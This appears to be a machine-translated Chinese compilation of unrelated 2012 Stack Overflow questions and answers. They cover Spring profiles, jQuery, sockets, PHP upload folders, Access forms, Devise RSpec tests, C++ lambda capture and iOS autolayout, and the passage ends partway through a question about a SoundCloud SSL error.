*   从新 URL 结帐新项目

# spring - 如何控制在测试环境和生产环境之间变化的弹簧注入？

> ID：13093346
> 
> 赞同：4
> 
> 时间：2012-10-26T19:40:26.480
> 
> 标签：spring, maven, struts2, continuous-integration, integration-testing

我正在设置一个 CI 情况，我将在其中将我的 Web 应用程序部署到测试环境。在这个测试环境中，我希望应用程序使用的业务对象是真实对象的模拟；模拟将返回静态测试数据。我正在使用它对我的 ui 运行测试。我正在使用 Spring 控制这些业务对象依赖项的注入；这是一个 struts 2 应用程序，值得。

我认为我的问题与 Maven 相关。让我的 Maven 构建确定是否构建弹簧配置以注入模拟或注入真实事物的最佳方法是什么？这对 Maven 配置文件有用吗？其他选择？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T19:47:51.247

Spring 本身支持[配置文件](http://blog.springsource.org/2011/02/14/spring-3-1-m1-introducing-profile/)（如果您使用的是 3.1 或更高版本），对于 Web 应用程序，您可以使用 context-parameter 为**web.xml**中的不同环境设置活动配置文件：

```
<context-param>
   <param-name>spring.profiles.default</param-name>
   <param-value>test</param-value>
</context-param> 
```

编辑：对于 Maven 和 Jenkins，您应该能够为构建作业设置参数，如下所示：

首先，让 Maven 过滤您的 xml-resources（在此示例中，仅过滤以结尾的文件`xml`，其他文件不过滤），方法是将以下内容添加到您的**pom.xml**中的`<build> </build>`-tags 中：

```
 <resources>
        <resource>
            <directory>src/main/webapp</directory>
            <filtering>true</filtering>
            <includes>
                <include>**/*xml</include>
            </includes>
        </resource>
        <resource>
            <directory>src/main/webapp</directory>
            <filtering>false</filtering>
            <excludes>
                <exclude>**/*xml</exclude>
            </excludes>
        </resource>
    </resources> 
```

**然后，在web.xml**中参数化上下文参数：

```
<context-param>
   <param-name>spring.profiles.default</param-name>
   <param-value>${env.SPRINGPROFILE}</param-value>
</context-param> 
```

然后在 Jenkins 中参数化构建作业，为 SPRINGPROFILE 设置所需的字符串参数（例如*test*或*prod*）：[https ://wiki.jenkins-ci.org/display/JENKINS/Parameterized+Build](https://wiki.jenkins-ci.org/display/JENKINS/Parameterized+Build)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T20:35:13.683

对 Web 应用程序工件的构建做任何事情可能是个坏主意（[使用 CI/Hudson 支持为多个环境 [prod、test、dev] 生成工件的 Maven 最佳实践？](https://stackoverflow.com/questions/2424118/maven-best-practice-for-generating-artifacts-for-multiple-environments-prod-te)）。虽然您可以使用各种机制来为不同的上下文生成具有不同 Spring 注入配置的 WAR 文件，但每次构建 WAR 工件时都应该是相同的。

为了从 WAR 中提取配置，我使用了 Spring 3 从外部属性文件中提取覆盖值的能力。我定义了我的业务对象的默认值，即生产值。我配置 spring 来检查属性文件的存在，当应用程序处于测试环境中并且需要模拟注入时，我将部署该文件。如果该属性文件存在，则将其值注入。这是spring配置文件的相关位。

```
<!-- These are the default values -->
    <util:properties id="defaultBeanClasses">
    <prop key="myManagerA">com.myco.ManagerAImpl</prop>
    <prop key="myManagerB">com.myco.ManagerBImpl</prop>
</util:properties>

<!-- Pull in the mock overrides if they exist. -->
<context:property-placeholder 
    location="file:///my/location/mockBeans.properties"
    ignore-resource-not-found="true"
    properties-ref="defaultBeanClasses"/>

<!-- The beans themselves. -->  
<bean id="managerA" class="${myManagerA}"/>
<bean id="managerB" class="${myManagerB}"/> 
```

这是外部“mockBeans.properties”文件的内容：

```
#Define mock implementations for core managers
myManagerA=com.myco.ManagerAMockImpl
myManagerB=com.myco.ManagerBMockImpl 
```

这很好用。如果您愿意，您甚至可以将 mockBeans.properties 文件包含在实际的 WAR 中，但不能包含在实时位置中。那么测试环境任务也会将其移动到spring config指向的位置。或者，您可以让模拟属性驻留在完全不同的项目中。

# asp.net-mvc - .NET Mvc 3 返回 OData JSON 结果

> ID：13093353
> 
> 赞同：2
> 
> 时间：2012-10-26T19:41:00.550
> 
> 标签：asp.net-mvc, json, asp.net-mvc-3, rest, odata

我试图让 ASP.NET MVC3 返回一个数组作为 OData 结果。

我没有计划也不想在 MVC4 中使用 WebAPI，因为它删除了我们已经存在的抽象。也就是说，我们永远不会将底层表模式/结构暴露给应用程序层。

所以我打算自己手动解析OData查询，这没什么大不了的。

但是，我应该如何以与 OData (JSON) 格式一致的方式返回结果集。我正在寻找是否存在一些先前的工作。

# jquery - 页面加载缓慢/结构显示，下拉在 IE 中不起作用

> ID：13093354
> 
> 赞同：0
> 
> 时间：2012-10-26T19:41:10.420
> 
> 标签：jquery, drop-down-menu

关于我正在开发的网站的两个问题...

我的网站： [http](http://thendesign.com/new/type.html) ://thendesign.com/new/type.html （我没有加载所有内容，所以我知道我的一些图片链接不存在）

1.  刷新页面时，我的代码结构在页面加载之前会闪烁。我已经尝试合并我所有的 .css 和 .js 文件，所以它只提取一个文件，但它没有任何帮助。还有什么我可以做的吗？

2.  我喜欢我所做的 CSS 下拉菜单，但它在 Internet Explorer 中根本不起作用。我是否需要完全抛弃这个概念并使用 jQuery 做点什么？我尝试的 jQuery 与索引页面上的手风琴图像滑块冲突（单击左上角的徽标进入索引页面）。

关于一个好的 jQuery 下拉菜单的建议或者我需要做什么才能让我的下拉菜单在 IE 中工作（我知道透明背景是一个问题 - 我可以让它在接受但在 IE 中稳定的地方透明吗？？）

提前感谢你的帮助！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:09:48.583

出现这种现象的原因是，在将“domenabled”类添加到正文之前，您不会隐藏所有这些元素`ul2finder`。由于这是在`window.onload`处理程序中完成的，因此在第一次呈现页面之前不会发生。与其在那里做，不如将内联 JavaScript 中的检查放在`type.html`. 然后它将在渲染身体的其余部分之前生效。

更新：在`<body>`标签之后，添加：

```
<script type="text/javascript">
if(document.getElementById && document.createTextNode && document.getElementById('finder')) {
    // add the class domenabled to the body
    cssjs('add',document.body,'domenabled');
}
</script> 
```

更新 2：

这是不对的。`domenabled`类不是导致事物被隐藏的原因。评论中有一个循环`finder.js`：

```
// loop through all lists inside finder, position and hide them 
// by applying the class hidden 
```

这就是隐藏所有这些元素的原因。在页面加载之前，这些都不会运行。

我不知道你的 CSS 下拉菜单，但也许 Modernizr 可以在那里提供帮助。

# multithreading - 您可以使用相同的套接字将请求发送到您之前在 C++ 中发送的服务器吗

> ID：13093356
> 
> 赞同：0
> 
> 时间：2012-10-26T19:41:18.723
> 
> 标签：multithreading, visual-studio-2010, sockets, visual-c++, client

假设您通过套接字连接连接到服务器，并且有一次您将请求发送到服务器并接收响应，然后您再次尝试将请求发送到服务器但是 send(); 返回-1，因为服务器在一段时间后服务器关闭，您可以使用相同的套接字向服务器发送请求吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:53:44.763

不，当您收到错误时，连接不再有效。一旦连接失效，您应该关闭套接字；您不能将其重新用于新连接。如果服务器宕机了，它不记得原始连接的参数（例如端口号）；您需要打开一个新连接，以便客户端和服务器同步。

# java - NSMutableArray 中的类类型

> ID：13093360
> 
> 赞同：1
> 
> 时间：2012-10-26T19:41:24.260
> 
> 标签：java, objective-c, class, arraylist, nsmutablearray

> **可能重复：**
> [有没有办法强制在 NSArray、NSMutableArray 等上输入？](https://stackoverflow.com/questions/649483/is-there-any-way-to-enforce-typing-on-nsarray-nsmutablearray-etc)

我是 Java 程序员，我从 Obj-C 开始，在 java 中我可以创建一个具有确定类类型的可变数组，如下所示：

```
ArrayList<MyClass> list; 
```

在 Obj-c 中我知道 NSMutableArray 但我不知道也没有找到如何确定类的类型。

有没有办法用它或其他没有 NSMutableArray 的类来做到这一点？

非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T19:44:33.943

不，Cocoa/Objective-C 不提供这样的类型化集合。集合中的所有对象都必须继承自`NSObject`（这基本上是除了原语和结构之外的所有对象），但除此之外，由您来理解/管理数组中发生的事情。an 中的对象在`NSMutableArray`其接口中由泛型类型表示`id`。

* * *

从设计的角度来看，Cocoa 中的集合通常确实包含同质类型的对象。数组的名称通常用于指示其中的内容（就像在 Java 中一样），例如`bookTitlesArray`或只是`bookTitles`（即字符串）。此外，从抽象的角度来看，有时轻量级类用于“包装”原始`NSMutableArray`数据以在接口处强制进行类型检查。例如，一个名为的新类`BookTitleList`提供了添加、查找、删除方法的子集，并在验证后将它们传递给内部数组。但 YMMV 取决于您的需要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:47:44.587

尽管 Objective C 中没有类型参数，但您会发现它比 Java 中的麻烦要少得多，因为您不必向下转换即可调用方法。在这方面，Objective C 更像 JavaScript。

# php - 图片上传表单后我的临时文件夹是否可以发现？

> ID：13093365
> 
> 赞同：0
> 
> 时间：2012-10-26T19:41:34.993
> 
> 标签：php

我有一个简单的 php 图片上传表单，将图片保存在一个临时文件夹中，我们称之为 temp，当图片被我批准后，我手动将其复制到相册文件夹中。

我的问题是，如果有人或我不知道有办法，搜索引擎可能会找到“猜测”我的临时文件夹以及里面有什么图像（在批准之前）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:52:35.617

你自己写的：

> 温度在 public_html 里面

这不是回答你的问题吗？

如果不希望这样做，请在 temp 文件夹中创建一个*.htaccess*文件，其中包含以下内容：

```
Deny from all 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:46:02.703

这取决于临时文件夹的位置。如果该文件夹位于服务器的根目录之外，则它是不可发现的，但如果它位于根目录内，则它是可发现的。但是，如果临时文件夹位于服务器的根目录内，则可以通过 htaccess 限制对临时文件夹的访问。或者您可以将 index.php 文件放在带有标头重定向的文件夹内，这样任何人都无法看到文件（图像）列表。

# c# - Symbian Windows Phone 蓝牙通讯

> ID：13093367
> 
> 赞同：0
> 
> 时间：2012-10-26T19:41:47.330
> 
> 标签：c#, qt, windows-phone-7, bluetooth, symbian

如果想分别使用 Qt 和 C# 在 Symbian 和 Windows Phone 之间传递蓝牙消息，我会怎么做？哪些 API 或类能够在两个平台之间进行通信？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:48:09.370

Windows Phone 7 没有为我们提供任何通过蓝牙进行通信的公共 API。

因此，您不能编写适用于蓝牙设备的应用程序。

# android - 精简版应用程序无法启动，因为它无法绑定到服务（还安装了完整版）

> ID：13093374
> 
> 赞同：1
> 
> 时间：2012-10-26T19:42:24.903
> 
> 标签：android

我刚刚完成了我的应用程序的构建，一切运行良好。所以我决定也创建一个精简版。我将我的 android 项目转换为一个 android 库，并创建了一个 lite 项目和一个完整的项目，每个项目都引用了该库。

我以这种方式运行了我的完整版本，效果很好。然后我尝试运行我的精简版，它抱怨“SecurityException: Not allowed to bind to service Intent...”

它指的是我从每个活动绑定到的本地服务。

我猜是因为该服务在两个应用程序中具有相同的包名称，所以精简版应用程序会感到困惑并尝试连接到完整应用程序的服务......

我怎样才能在尽可能少的干扰的情况下解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T22:55:41.157

好吧，看到我没有得到任何回复......我想我会分享我最终做了什么。如果部署在两个应用程序中，我对需要唯一包名称的服务的怀疑是正确的。

因此，我现在只有一个 android 项目，而不是一个库和两个项目。在其中我有一个静态标志常量，我根据我想要运行的内容进行更改。在一种情况下，我生成了一个关闭标志的 APK。然后我为整个项目重命名包（eclipse重构）并生成另一个打开标志的APK。

当标志打开时，应用程序的某些部分被锁定（所以是精简版）。当它关闭时，它是完整版。

完成后，我将恢复为基础并删除所有更改。

这不是我希望的理想解决方案，但只需一分钟即可完成。所以这没什么大不了的。

# forms - 在 Access 中创建“日历矩阵”

> ID：13093375
> 
> 赞同：5
> 
> 时间：2012-10-26T19:42:29.003
> 
> 标签：forms, ms-access, matrix, report, vba

我正在尝试创建以“日历”形式显示数据的报告或表单。

我有一个课程查询（简化）为“课程名称”；“课程日”；“课程时间”——

```
Course; Days; Times
PSY 1; MW; 8A-9A
SOC 150; M; 8A-11A
ANTH 2; Tu; 8A-9A
ANTH 199; MW; 8A-9A 
```

在 Access 中，我正在尝试根据查询创建一个表单，该表单将为我提供以下矩阵：

*   列：以小时为单位的时间
*   行：星期几

因此，例如，使用上述数据，它会如下所示： 编辑：Yargh，不幸的是，我无法提交图像。[所以，这里有一个“课程表](http://www.mc.vanderbilt.edu/dbmi/images/Course_schedule_spring_2008.png)”的链接，这基本上就是我想要做的：

我不知道从哪里开始。任何提示（或链接）？

编辑：

我的一个想法是为矩阵中的每个可能的单元格创建一个包含字段的表单（例如，将有一个“星期一，8-9A”字段 - 该字段将是查询的过滤器仅显示“day”包含“M”和 BeginTime 或 EndTime 或介于 8A 和 9A 之间的结果。不幸的是，我不知道该怎么做。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-27T19:14:23.910

您可以做一些接近您似乎想要的访问表单的事情，但这并不容易。此屏幕截图在*数据表视图*窗体中显示您的示例数据，其记录源是 ADO 断开连接的记录集。当文本框值不为 Null 时，它使用条件格式设置文本框背景颜色。*您的图片为每门课程*建议了不同的颜色，但是当可以在同一时间段内安排多个*课程*时，我不想处理这个问题……我的方式更容易应付。:-)

![在此处输入图像描述](../Images/22992743d38c3b4572916409e8e5a4c0.png)

创建和加载断开连接的记录集的代码包含在下面的`GetRecordset()`. 表单的打开事件将其记录集设置为`GetRecordset()`。

```
Private Sub Form_Open(Cancel As Integer)
    Set Me.Recordset = GetRecordset
End Sub 
```

注意我以不同的方式存储了您的示例数据。这是我的`Class_sessions`桌子：

```
Course   day_of_week  start_time  end_time
------   -----------  ----------  -----------
PSY 1              2  8:00:00 AM   9:00:00 AM
PSY 1              4  8:00:00 AM   9:00:00 AM
SOC 150            2  8:00:00 AM  11:00:00 AM
ANTH 2             3  8:00:00 AM   9:00:00 AM
ANTH 199           2  8:00:00 AM   9:00:00 AM
ANTH 199           4  8:00:00 AM   9:00:00 AM 
```

这是创建断开连接记录集的功能，这是此方法的关键部分。我使用早期绑定开发了这个，它需要“ *Microsoft ActiveX Data Objects [version] Library* ”的参考；我用的是2.8版。对于生产用途，我会将代码转换为使用后期绑定并丢弃引用。我将其保留为早期绑定，以便您可以使用 Intellisense 来帮助您了解它的工作原理。

```
Public Function GetRecordset() As Object
    Dim rsAdo As ADODB.Recordset
    Dim fld As ADODB.Field
    Dim db As DAO.Database
    Dim dteTime As Date
    Dim i As Long
    Dim qdf As DAO.QueryDef
    Dim rsDao As DAO.Recordset
    Dim strSql As String

Set rsAdo = New ADODB.Recordset
With rsAdo
    .Fields.Append "start_time", adDate, , adFldKeyColumn
    For i = 2 To 6
        .Fields.Append WeekdayName(i), adLongVarChar, -1, adFldMayBeNull
    Next
    .CursorType = adOpenKeyset
    .CursorLocation = adUseClient
    .LockType = adLockPessimistic
    .Open
End With

strSql = "PARAMETERS block_start DateTime;" & vbCrLf & _
    "SELECT day_of_week, Course, start_time, end_time" & vbCrLf & _
    "FROM Class_sessions" & vbCrLf & _
    "WHERE [block_start] BETWEEN start_time AND end_time" & vbCrLf & _
    "ORDER BY day_of_week, Course;"
Set db = CurrentDb
Set qdf = db.CreateQueryDef(vbNullString, strSql)

dteTime = #7:00:00 AM#
Do While dteTime < #6:00:00 PM#
    'Debug.Print "Block start: " & dteTime
    rsAdo.AddNew
    rsAdo!start_time = dteTime
    rsAdo.Update

    qdf.Parameters("block_start") = dteTime
    Set rsDao = qdf.OpenRecordset(dbOpenSnapshot)
    Do While Not rsDao.EOF
        'Debug.Print WeekdayName(rsDao!day_of_week), rsDao!Course
        rsAdo.Fields(WeekdayName(rsDao!day_of_week)) = _
            rsAdo.Fields(WeekdayName(rsDao!day_of_week)) & _
            rsDao!Course & vbCrLf
        rsAdo.Update
        rsDao.MoveNext
    Loop

    dteTime = DateAdd("h", 1, dteTime)
Loop

rsDao.Close
Set rsDao = Nothing
qdf.Close
Set qdf = Nothing
Set GetRecordset = rsAdo
End Function 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-27T20:22:20.073

实际上，如果您观看我的以下视频，您可以看到在 Access 中创建的日历，该日历在具有新 Access Web 发布功能的浏览器内运行。

[http://www.youtube.com/watch?v=AU4mH0jPntI](http://www.youtube.com/watch?v=AU4mH0jPntI)

因此，您在这里真正需要做的就是用文本框格式化表单并设置一些代码来填充它们。VBA 甚至上面的视频显示这对于 Access 来说非常容易。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-27T15:12:18.830

我怀疑您是否会在 Access 表单或报告中找到解决此问题的简单方法。
问题是您需要以不同的方式格式化不同的单元格，并且单元格可以跨越多行并且必须合并。

如果我是你，我会朝这两个方向走：

*   从 Access 驱动 Excel，因为您可以独立格式化和合并单元格
*   使用[Web 浏览器控件](http://office.microsoft.com/en-us/access-help/add-web-browsing-to-a-form-HA101631434.aspx)显示您使用表格或更高级别的库（如[FullCalendar）构建的 HTML](http://arshaw.com/fullcalendar/)

我会偏爱尝试 Web 浏览器并找到可以正确格式化数据的正确库。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-13T10:04:55.200

我知道这篇文章很老了，但我有同样的要求，但我通过执行以下操作来解决它：

*   我创建了一个模块，该模块将编写 HTML 代码（作为文本文件）以使用表格生成数据。
*   我使用表的 colspan 功能来动态生成所需的视图。
*   HTML 文件是在 Form_Open 事件上创建的，通过将 webbrowser 控件指向 HTML 文件，视图会显示最新数据。
*   css 文件用于处理 HTML 文件的可视化显示，使其看起来类似于已在使用的 Access 表单。

如果有人有兴趣，我可以发布一些代码来进一步说明。

# javascript - 加载后如何将 src 属性附加到一组图像？

> ID：13093392
> 
> 赞同：0
> 
> 时间：2012-10-26T19:43:55.020
> 
> 标签：javascript, jquery, infinite-scroll

这是我的场景：

我有一个带有分页并通过无限滚动增强的页面

该页面有一个项目列表，其中每个项目在 smarty 中看起来像这样

```
<div id="link-{index}">
<div align="left"><a href={$url}></div><div alight="right"><img src="" id="{$url}"></div>
</div> <script>imager({$url});</script> 
```

我正在使用一项服务来动态获取给定 URL 的图像 src，并通过定义将其附加到图像中`imager(x){ document.getElementById(x).src = service(x).image; }`

现在这有效，只要使用正常的分页，就可以在侧 URL 上显示正确的图像。不适用于第 2 页以后的无限滚动，因为它使用 JQuery 并解析每个项目的成像器 JS 脚本。

我坚持尝试为无限滚动创建一个回调函数，该函数将执行成像器所做的工作，但在加载页面后但我无法让它工作。

任何提示将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T06:46:21.273

在加载新页面时的回调中，您可以执行以下操作：

```
$('img:not([src])').each(function() {
    $(this).attr('src', service($(this).attr('id')).image);
}); 
```

这假设唯一没有来源的图像是那些刚刚由无限滚动器加载的图像。如果小部件向回调提供参数，告诉它 DOM 的哪些部分刚刚被分页，您可以使用它来进一步缩小范围；jQuery 选择器的第二个参数是要搜索的上下文。

# ruby-on-rails - 任何人都知道一整套 Devise Rspec / Capybara 测试

> ID：13093403
> 
> 赞同：0
> 
> 时间：2012-10-26T19:44:54.090
> 
> 标签：ruby-on-rails, testing, rspec, devise, suite

我一直在使用 Devise 学习 Rails 3，到目前为止，它似乎运行良好。我有自定义会话和注册控制器，recaptcha 正在工作，登录用户可以通过 carrierwave 上传头像，该头像保存在 S3 上。对我的进步很满意。

现在我正在编写 Rspec 测试。没那么顺利！我有一个合理的用户模型测试，但那是因为我在网上找到了它（https://github.com/RailsApps/rails3-devise-rspec-cucumber/）并且能够通过跟随 Michael Hartl 的优秀“Ruby on Rails 3 教程”。

我真正的问题是控制器测试和集成测试，尤其是控制器测试。最初我以为我可以转换迈克尔书中的测试，我必须达到一个很小的程度，但进展缓慢，而且我似乎经常用头撞砖墙 - 我认为部分原因是因为我不我不太了解 Rspec 和 capybara（犯了一些非常愚蠢的错误），但也因为我对 Devise 的理解不够好，我想知道 Devise 是否能像 Rspec 一样出色地发挥作用；我在某处读到，因为 Devise 是基于 Rack 的，它可能并不总是像人们期望的那样使用 Rspec。不知道是真是假？

我知道有些人会想知道为什么这可能是必要的，因为 Devise 是一个 gem，因此已经过测试，但是我有几个例子，其他地方的更改在我没有立即意识到的情况下破坏了登录或注册。我认为一套好的控制器和集成测试可以解决这个问题。

如果我自己能够做到这一点，我会并且我会为其他人发布它，但到目前为止，编写这些测试非常痛苦，我真的需要继续做其他事情。

我敢肯定，我不会是唯一一个可以使用它的人。有人知道这样一套测试吗？

**为了回应杰西的帮助...**

这是我的registrations_controller_spec。“应该呈现'编辑'页面”中的评论显示了我正在努力解决的问题。此外，“应该创建一个用户”有一些我尝试过测试但无法做到的事情：

```
require File.dirname(__FILE__) + '/../spec_helper'

describe Users::RegistrationsController do
  include Devise::TestHelpers
  fixtures :all
  render_views

  before(:each) do
    @request.env["devise.mapping"] = Devise.mappings[:user]
  end

  describe "POST 'create'" do
    describe "failure" do
      before(:each) do
        @attr = { :email => "", :password => "",
                  :password_confirmation => "", :display_name => "" }
      end

      it "should not create a user" do
        lambda do
          post :create, :user_registration => @attr
        end.should_not change(User, :count)
      end

      it "should render the 'new' page" do
        post :create, :user_registration => @attr
        response.should render_template('new')
      end
    end

    describe "success" do
      before(:each) do
        @attr = { :email => "user@example.com",
                  :password => "foobar01", :password_confirmation => "foobar01", :display_name => "New User" }
      end

      it "should create a user" do
        lambda do
          post :create, :user => @attr
          response.should redirect_to(root_path)
          #response.body.should have_selector('h1', :text => "Sample App")
          #response.should have_css('h1', :text => "Sample App")
          #flash[:success].should == "A message with a confirmation link has been sent to your email address. Please open the link to activate your account."
          #response.should have_content "A message with a confirmation link has been sent to your email address. Please open the link to activate your account."
        end.should change(User, :count).by(1)
      end

    end

  end

  describe "PUT 'update'" do
    before(:each) do
      @user = FactoryGirl.create(:user)
      @user.confirm! # or set a confirmed_at inside the factory. Only necessary if you are using the confirmable module
      sign_in @user
    end

    describe "Failure" do

      before(:each) do
        # The following information is valid except for display_name which is too long (max 20 characters)
        @attr = { :email => @user.email, :display_name => "Test", :current_password => @user.password }
      end

      it "should render the 'edit' page" do
        put :update, :id => subject.current_user, :user => @attr

        # HAVE PUT THE DEBUGS THAT I'D LIKE TO GET WORKING FIRST
        # Would like to be able to debug and check I'm getting the error(s) I'm expecting
        puts subject.current_user.errors.messages # doesn't show me the errors
        # Would like to be able to debug what html is being returned:
        puts page.html # only return the first line of html

        # Would like to be able to determine that this test is failing for the right reasons
        response.should have_content "Display name is too long (maximum is 20 characters)" # doesn't work

        response.should render_template('edit')
      end
    end

    describe "Success" do

      it "should change the user's display name" do
        @attr = { :email => @user.email, :display_name => "Test", :current_password => @user.password }
        put :update, :id => subject.current_user, :user => @attr
        subject.current_user.reload
        response.should redirect_to(root_path)
        subject.current_user.display_name == @attr[:display_name]
      end

    end
  end

  describe "authentication of edit/update pages" do

    describe "for non-signed-in users" do

      before(:each) do
        @user = FactoryGirl.create(:user)
      end

      describe "for non-signed-in users" do

        it "should deny access to 'edit'" do
          get :edit, :id => @user
          response.should redirect_to(new_user_session_path)
        end

        it "should deny access to 'update'" do
          put :update, :id => @user, :user => {}
          response.should redirect_to(new_user_session_path)
        end

      end

    end
  end

end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:04:28.077

根据[Devise Wiki](https://github.com/plataformatec/devise/wiki/)，控制器测试必须是某种混合（单元 + 集成）测试。您必须在数据库中创建用户（或您的身份验证实体）的实例。模拟设计的东西真的很难，相信我。

试试这个：[How-To:-Controllers-and-Views-tests-with-Rails-3-and-rspec](https://github.com/plataformatec/devise/wiki/How-To%3a-Controllers-and-Views-tests-with-Rails-3-%28and-rspec%29)

使用 Cucumber，您可以创建一个已经完成登录过程的步骤。

希望能帮助到你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T18:31:10.873

好的，所以有几件事可以使这项工作：

以下是您应该如何测试正文是否具有特定文本（您缺少 .body

```
response.body.should include "Display name is too long (maximum is 30 characters)" 
```

您还可以测试@user 是否有错误：

```
assigns[:user].errors[:display_name].should include "is too long (maximum is 30 characters)" 
```

但是，您确实需要使名称的长度超过 20/30 个字符，因此我将发布的属性更改为：

```
@attr = { :email => @user.email, :display_name => ("t" * 35), :current_password => @user.password } 
```

[https://gist.github.com/64151078628663aa7577](https://gist.github.com/64151078628663aa7577)

# php - 无法获取应用程序授权令牌

> ID：13093405
> 
> 赞同：2
> 
> 时间：2012-10-26T19:44:55.150
> 
> 标签：php, facebook-graph-api

我对旧的 Facebook 应用程序有很大的问题。我认为它使用旧的 oAuth 并且问题开始了......它说 appid 或 appsecret 无效但它是正确的......

这是所有 admin.php：[admin.php](http://pastebin.com/5TjAinpP)

抱歉，PasteBin 但文件太大，无法将其粘贴到那里...

它说：“您输入的应用程序 ID 和密钥似乎无效（无法获取应用程序授权令牌）”

这是有问题的代码：[点击！](http://pastebin.com/KGXpdY8T)

你能解释什么是错的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T05:39:06.133

您可以从这里为您的每个应用程序获取应用程序访问令牌 [https://developers.facebook.com/tools/access_token/](https://developers.facebook.com/tools/access_token/)

除非您重置密码，否则它不会改变，您可以将其硬编码为配置变量以根据需要使用。真的只需要得到它一次。

# c++ - Lambda 变量捕获

> ID：13093407
> 
> 赞同：0
> 
> 时间：2012-10-26T19:45:10.103
> 
> 标签：c++, lambda, c++11

我对 lambda 表达式的变量捕获部分的性质感到困惑。

```
void f1();
std::function<int()> f2;

int main() {
    f1();
    std::cout<<f2()<<endl;
}

void f1() {
    int x;
    f2 = [&]() {
        return x;
    };
} 
```

不是在调用`x`之前解构吗？`f2`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:16:33.927

Yes. You have successfully invoked undefined behavior. One possible outcome is that you get the value of x. Another is that the computer formats your hard drive, the program crashes, or the computer transforms into a robotic baker-assassin that feeds you cupcakes, mistakenly thinking you have celiac disease.

A safe variant of this might be:

```
int main() {
    f1(7);
    std::cout<<f2()<<endl;
}

void f1(int x) {
    std::shared_ptr<int> spX( new int(x) );
    f2 = [=]() {
        return *spX;
    };
} 
```

or

```
void f1(int x) {
    f2 = [=]() {
        return x;
    };
} 
```

(for an int, there is little reason not to store it by value: for a more complex type, you might want to avoid copying it around needlessly).

Note that the comment above explains this in a funnier way.

Now, some compilers will mark the stack with special values when you decrement it to catch exactly this kind of undefined behavior (and by catch, I mean make it more obvious to the programmer). But for the most part, invoking undefined behavior in C++ is possible.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T20:10:09.027

> > x 在调用 f2 之前不是解构了吗？

是的。这意味着`return x`评估一个悬空引用，它调用未定义的行为。

在这种情况下，您可能更喜欢按值捕获。

```
f2 = [x]() { return x; } 
```

# iphone - iOS 5 上的应用程序崩溃 - 无法实例化名为 NSLayoutConstraint 的类

> ID：13093409
> 
> 赞同：10
> 
> 时间：2012-10-26T19:45:15.913
> 
> 标签：iphone, ios5, ios6, autolayout, nslayoutconstraint

我的应用程序在 iOS 6 的 iPhone 和模拟器上运行良好，但是当我尝试在 iOS 5 的 iPhone/模拟器上运行时，应用程序崩溃

错误是：

> 由于未捕获的异常“NSInvalidUnarchiveOperationException”而终止应用程序，原因：“无法实例化名为 NSLayoutConstraint 的类”

我没有在 Interface Builder Document 上使用 Autolayout。

有人可以帮我吗？

**未选中自动布局**

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-10-26T20:15:30.970

确保您在 interfacebuild 中未选择使用自动布局

![在此处输入图像描述](../Images/9fc7a4c12ffd82c4b9a2f1bdbe3be4bc.png)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-10-26T21:08:28.613

你被烧死了。NSLayoutConstraint 仅存在于 iOS 6 上。您必须检查它是否存在，如果不存在，则必须执行其他操作。

# javascript - 如何使用 .change() 仅检查页面的一部分

> ID：13093410
> 
> 赞同：1
> 
> 时间：2012-10-26T19:45:15.840
> 
> 标签：javascript, jquery, html, checkbox

我在一个页面上有一堆 html 复选框，但想要有两组不同的复选框。我在想我可以将它们分配到一个类中或将它们插入到一个 div 中，以便我可以以某种方式分别引用它们......？只是不确定如何在语法上执行此操作。

例如，目前我正在使用

```
$('input[type=checkbox]').change(function(){ /*insert my code functionality here*\ }); 
```

引用复选框，但是当我只希望它应用于其中的一半时，这会更改我的所有复选框。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:01:25.927

你可以试试这个

**HTML**

```
<input type="checkbox" value="1" class="group1" name="chk1" />Check One
<input type="checkbox" value="2" class="group1" name="chk2" />Check Two

<input type="checkbox" value="3" class="group2" name="chk3" />Check One
<input type="checkbox" value="4" class="group2" name="chk4" />Check Two​ 
```

**JS**

```
$('input[type=checkbox].group1').change(function(){
   // code
});

$('input[type=checkbox].group2').change(function(){
   // code
}); 
```

[**一个例子在这里**](http://jsfiddle.net/56NZj/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:01:41.777

就像您在问题中所说的那样，使用课程。

然后你可以这样做：

```
$(".check-1, .check-2").change(function(e) {
    /* do work */
}); 
```

# [见 jsFiddle](http://jsfiddle.net/SpYk3/vqUVE/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:49:53.647

使用类将它们分成两组..

```
.tobechecked  // Assign a class to all the checkboxes that need to 
              // for this event

$('.tobechecked').change(function(){ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-26T19:51:37.080

通过不同的类识别组，然后您可以通过jquery按类确定它。

```
$('.specific_group_class').change(function(){..} 
```

# java - Soundcloud JAVA api 包装器：SSLException

> ID：13093412
> 
> 赞同：0
> 
> 时间：2012-10-26T19:45:26.843
> 
> 标签：java, ssl, soundcloud

为 API使用 soundcloud [JAVA 包装器时](https://github.com/soundcloud/java-api-wrapper)

我收到以下 SSL 错误

```
javax.net.ssl.SSLException: hostname in certificate didn't match: 
